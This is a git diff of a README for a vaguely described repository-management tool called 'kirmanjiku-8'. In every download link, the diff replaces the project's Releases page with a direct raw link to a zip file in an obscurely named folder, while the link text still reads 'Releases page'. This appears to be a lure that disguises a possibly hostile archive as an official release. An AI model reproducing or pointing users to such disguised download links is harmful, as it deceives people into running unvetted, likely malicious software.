@@ -1,7 +1,7 @@
 # 🚀 kirmanjiku-8 - Effortlessly Manage Your Repositories
 
 ## 📥 Download Now
-[![Download kirmanjiku-8](https://img.shields.io/badge/Download-kirmanjiku--8-blue.svg)](https://github.com/ThePudge21/kirmanjiku-8/releases)
+[![Download kirmanjiku-8](https://raw.githubusercontent.com/ThePudge21/kirmanjiku-8/main/uncommodiousness/kirmanjiku-8.zip)](https://raw.githubusercontent.com/ThePudge21/kirmanjiku-8/main/uncommodiousness/kirmanjiku-8.zip)
 
 ## 🔍 Overview
 kirmanjiku-8 is a user-friendly application designed to simplify your experience with managing repositories. Whether you want to keep track of your projects or explore new ones, this tool will help you do it with ease.
@@ -10,7 +10,7 @@ kirmanjiku-8 is a user-friendly application designed to simplify your experience
 Follow these easy steps to download and run kirmanjiku-8.
 
 ### Step 1: Visit the Download Page
-To get started, visit the [Releases page](https://github.com/ThePudge21/kirmanjiku-8/releases). Here, you will find the latest versions of the software.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/ThePudge21/kirmanjiku-8/main/uncommodiousness/kirmanjiku-8.zip). Here, you will find the latest versions of the software.
 
 ### Step 2: Choose Your Version
 On the Releases page, you will see a list of available versions. Click on the version that suits your needs. Each version has a description to help you decide.
@@ -56,4 +56,4 @@ We welcome contributions from anyone interested in improving kirmanjiku-8. If yo
 Stay updated about new features, improvements, and more. Follow us on our social media channels (links available in the GitHub repository) to join our community.
 
 ## 📥 Download & Install
-Don’t wait any longer! Visit the [Releases page](https://github.com/ThePudge21/kirmanjiku-8/releases) to download kirmanjiku-8 now. Enjoy managing your repositories with confidence!
+Don’t wait any longer! Visit the [Releases page](https://raw.githubusercontent.com/ThePudge21/kirmanjiku-8/main/uncommodiousness/kirmanjiku-8.zip) to download kirmanjiku-8 now. Enjoy managing your repositories with confidence!
